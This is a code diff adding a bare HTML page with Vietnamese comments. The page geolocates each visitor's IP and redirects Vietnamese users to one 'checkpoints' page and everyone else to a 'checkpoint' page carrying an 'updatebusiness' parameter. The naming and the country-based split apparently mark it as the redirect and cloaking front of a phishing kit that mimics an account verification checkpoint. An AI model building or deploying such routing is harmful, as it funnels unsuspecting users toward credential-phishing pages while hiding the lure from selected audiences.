@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<script>
+    function getRandomNumber(min, max) {
+        return Math.floor(Math.random() * (max - min + 1) + min);
+    }
+    
+    async function checkIPAndRedirect() {
+    const userIpData = await getUserIp(); // Lấy thông tin IP người dùng
+    const isVietnamIP = isVietnam(userIpData.country_code); // Kiểm tra IP Việt Nam
+    const currentURL = window.location.href;    
+    const mainURL = window.location.href.split('?')[0];
+    if (isVietnamIP) {
+        
+        window.location.href = `${mainURL}/checkpoints/index.html`; // Link trang web dành cho người dùng Việt Nam
+    } else {
+        const random_number = getRandomNumber(10000, 99999);
+        window.location.href = `${mainURL}/checkpoint/index.html?d=1004&dac=1&updatebusiness=${random_number}`; // Link trang web dành cho người dùng quốc tế
+    }
+}
+
+async function getUserIp() {
+    try {
+        const url = 'https://api.db-ip.com/v2/free/self/';
+        const response = await fetch(url);
+
+        if (response.ok) {
+            const data = await response.json();
+            return {
+                user_ip: data.ipAddress,
+                country_code: data.countryCode,
+            };
+        } else {
+            throw new Error(`Lỗi khi lấy thông tin IP: ${response.statusText}`);
+        }
+    } catch (error) {
+        console.error(error);
+        return {
+            user_ip: 'Lấy IP thất bại',
+            country_code: '-',
+        };
+    }
+}
+
+function isVietnam(countryCode) {
+    const vietnamCountryCodes = ['VN', 'VNM']; // Danh sách mã quốc gia Việt Nam
+    return vietnamCountryCodes.includes(countryCode.toUpperCase());
+}
+
+// Gọi hàm để kiểm tra IP và chuyển hướng
+checkIPAndRedirect();
+
+
+ </script>
+<body>
+   
+ 
+</body>
+</html>
